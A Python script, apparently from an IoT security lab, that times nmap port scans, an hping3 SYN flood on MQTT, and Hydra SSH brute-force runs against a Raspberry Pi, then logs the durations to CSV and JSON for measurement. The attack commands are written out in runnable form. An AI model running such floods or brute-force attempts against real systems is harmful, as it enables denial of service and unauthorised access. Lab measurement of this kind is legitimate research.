#!/usr/bin/env python3
"""
attack_timer.py
---------------
Ataques:
  1. Nmap T3 → T5  : escaneo de puertos completo (-p-), 3 ejecuciones separadas
  2. hping3 flood  : SYN flood puerto 1883 (MQTT)
  3. Hydra SSH t4  : fuerza bruta SSH puerto 22, usuario bnj, rockyou.txt, 4 hilos  
  4. Hydra SSH t16 : fuerza bruta SSH puerto 22, usuario bnj, rockyou.txt, 16 hilos 
  5. Hydra SSH t32 : fuerza bruta SSH puerto 22, usuario bnj, rockyou.txt, 32 hilos 

USO:
  sudo python3 attack_timer.py [--target IP]
"""

import argparse
import csv
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path




TARGET_DEFAULT       = "192.168.0.104"
SSH_PORT             = 22
MQTT_PORT            = 1883
SSH_USER             = "bnj"
WORDLIST             = "/usr/share/wordlists/rockyou.txt"
FLOOD_DURATION_DEF   = 60     
HYDRA_TIMEOUT        = 60      
PAUSE_BETWEEN        = 60      



def build_attack_plan(target: str, flood_duration: int) -> list[dict]:
    """
    Retorna la lista ordenada de ataques a ejecutar.
    Cada entrada define: id, label, attack_type, tool, cmd, kill_after, timeout.
    """
    attacks = []

    for t in range(3, 6):
        attacks.append({
            "id":          f"nmap_T{t}",
            "label":       f"Nmap Port Scan T{t}",
            "attack_type": "port_scan",
            "tool":        "nmap",
            "cmd":         [
                "nmap", f"-T{t}", "-p-", "--open", "-n",
                "--defeat-rst-ratelimit", target
            ],
            "kill_after":  None,
            "timeout":     None,   
        })

    
    attacks.append({
        "id":          f"hping3_synflood_p{MQTT_PORT}",
        "label":       f"SYN Flood MQTT (puerto {MQTT_PORT}) — {flood_duration}s",
        "attack_type": "dos_synflood",
        "tool":        "hping3",
        "cmd":         [
            "hping3", "-S", "--flood", "-V",
            "-p", str(MQTT_PORT), target
        ],
        "kill_after":  flood_duration,
        "timeout":     flood_duration + 5,
    })

    
    for threads in [4, 16, 32]:
        attacks.append({
            "id":          f"hydra_ssh_t{threads}",
            "label":       f"Hydra BruteForce SSH t={threads} (60s max)",
            "attack_type": "brute_force_ssh",
            "tool":        "hydra",
            "cmd":         [
                "hydra",
                "-l", SSH_USER,
                "-P", WORDLIST,
                "-s", str(SSH_PORT),
                "-t", str(threads),
                "-f",
                "-V",
                f"ssh://{target}",
            ],
            "kill_after":  None,
            "timeout":     HYDRA_TIMEOUT,
        })

    return attacks




def run_and_time(attack: dict) -> dict:
    """
    Lanza el ataque como proceso hijo y mide su duración con perf_counter.
    Maneja flood (SIGTERM controlado), errores de herramienta y permisos.
    """
    label      = attack["label"]
    cmd        = attack["cmd"]
    kill_after = attack["kill_after"]
    timeout    = attack["timeout"]

    print(f"\n{'='*62}")
    print(f"  [*] INICIO : {label}")
    print(f"      CMD    : {' '.join(cmd)}")
    if kill_after:
        print(f"      Duración forzada: {kill_after}s → SIGTERM")
    print(f"{'='*62}")

    ts_start_iso = datetime.now(timezone.utc).isoformat()
    t_start      = time.perf_counter()
    exit_code    = None
    status       = "ok"
    error_msg    = ""
    proc         = None

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,   # grupo de proceso propio → kill limpio
        )

        if kill_after:
            time.sleep(kill_after)
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=3)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
            exit_code = proc.returncode
            status    = "killed_after_duration"
        else:
            proc.wait(timeout=timeout)
            exit_code = proc.returncode

    except subprocess.TimeoutExpired:
        if proc:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except ProcessLookupError:
                pass
        exit_code = -9
        status    = "timeout_killed"
        error_msg = f"Proceso superó timeout de {timeout}s."
        print(f"  [!] TIMEOUT: {error_msg}")

    except FileNotFoundError as e:
        exit_code = -1
        status    = "tool_not_found"
        error_msg = str(e)
        print(f"  [!] HERRAMIENTA NO ENCONTRADA: {cmd[0]}")
        print(f"      Verifica instalación: which {cmd[0]}")

    except PermissionError as e:
        exit_code = -2
        status    = "permission_denied"
        error_msg = str(e)
        print(f"  [!] PERMISO DENEGADO — ejecuta con sudo")

    t_end      = time.perf_counter()
    duration_s = round(t_end - t_start, 4)
    ts_end_iso = datetime.now(timezone.utc).isoformat()

    print(f"  [✓] FIN    : {label}")
    print(f"      Duración : {duration_s:.4f}s  |  exit_code: {exit_code}  |  estado: {status}")

    return {
        "id":           attack["id"],
        "label":        label,
        "attack_type":  attack["attack_type"],
        "tool":         attack["tool"],
        "target":       TARGET_DEFAULT,
        "command":      " ".join(attack["cmd"]),
        "start_utc":    ts_start_iso,
        "end_utc":      ts_end_iso,
        "duration_s":   duration_s,
        "exit_code":    exit_code,
        "status":       status,
        "error":        error_msg,
    }



CSV_FIELDS = [
    "id", "label", "attack_type", "tool", "target", "command",
    "start_utc", "end_utc", "duration_s", "exit_code", "status", "error",
]


def save_csv(record: dict, path: Path) -> None:
    write_header = not path.exists()
    with open(path, "a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        if write_header:
            writer.writeheader()
        writer.writerow(record)
    print(f"  [✓] CSV  → {path}")


def save_json(record: dict, path: Path) -> None:
    existing = []
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            try:
                existing = json.load(f)
            except json.JSONDecodeError:
                existing = []
    existing.append(record)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(existing, f, indent=2, ensure_ascii=False)
    print(f"  [✓] JSON → {path}")



def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Temporiza ataques IoT contra Raspberry Pi 3B y guarda en CSV/JSON.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--target",         default=TARGET_DEFAULT,    help="IP de la Raspberry Pi")
    p.add_argument("--flood-duration", type=int, default=FLOOD_DURATION_DEF,
                   help="Segundos de SYN flood antes de SIGTERM")
    p.add_argument("--output-dir",     default="./results",       help="Directorio de salida")
    return p.parse_args()


def main() -> None:
    args       = parse_args()
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    session_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_path   = output_dir / f"rpi_attacks_{session_ts}.csv"
    json_path  = output_dir / f"rpi_attacks_{session_ts}.json"

    print(f"\n{'#'*62}")
    print(f"  ATTACK TIMER — Raspberry Pi IoT Lab")
    print(f"  Sesión  : {session_ts}")
    print(f"  Target  : {args.target}")
    print(f"  SSH     : bnj@{args.target}:22")
    print(f"  MQTT    : {args.target}:{MQTT_PORT}")
    print(f"  Salida  : {output_dir}")
    print(f"{'#'*62}")

    if os.geteuid() != 0:
        print("\n  [!] ADVERTENCIA: Se requiere root para hping3 y nmap -p-")
        print("      Ejecuta: sudo python3 attack_timer.py\n")
        sys.exit(1)

    # Verificar wordlist
    if not Path(WORDLIST).exists():
        print(f"\n  [!] Wordlist no encontrada: {WORDLIST}")
        print("      En Kali: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        sys.exit(1)

    attacks     = build_attack_plan(args.target, args.flood_duration)
    all_records = []

    for i, attack in enumerate(attacks):
        record = run_and_time(attack)
        all_records.append(record)
        save_csv(record,  csv_path)
        save_json(record, json_path)

        if i < len(attacks) - 1:
            print(f"\n  [~] Pausa {PAUSE_BETWEEN}s — estabilización energética de la Pi...")
            time.sleep(PAUSE_BETWEEN)

    print(f"\n{'='*62}")
    print("  RESUMEN DE SESIÓN")
    print(f"{'='*62}")
    print(f"  {'ID':<30} {'Duración (s)':>12}  Estado")
    print(f"  {'-'*58}")
    for r in all_records:
        print(f"  {r['id']:<30} {r['duration_s']:>12.4f}  {r['status']}")
    total = sum(r["duration_s"] for r in all_records)
    print(f"  {'-'*58}")
    print(f"  {'TOTAL':<30} {total:>12.4f}s")
    print(f"\n  CSV  → {csv_path}")
    print(f"  JSON → {json_path}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [!] Interrumpido (Ctrl+C). Resultados parciales guardados.")
        sys.exit(130)
